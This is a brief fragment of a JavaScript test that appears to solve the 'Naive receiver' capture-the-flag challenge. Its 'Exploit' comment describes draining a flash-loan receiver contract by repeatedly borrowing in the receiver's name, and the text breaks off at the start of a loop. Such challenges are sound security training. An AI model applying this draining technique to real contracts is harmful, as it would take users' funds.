...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        /** One way to do it in a single transaction would be to deploy a contract that keeps 
        taking a flashloan with the receiver's address until the user contract balance is 0 */ 
        for(let i=0;i<10;i++){
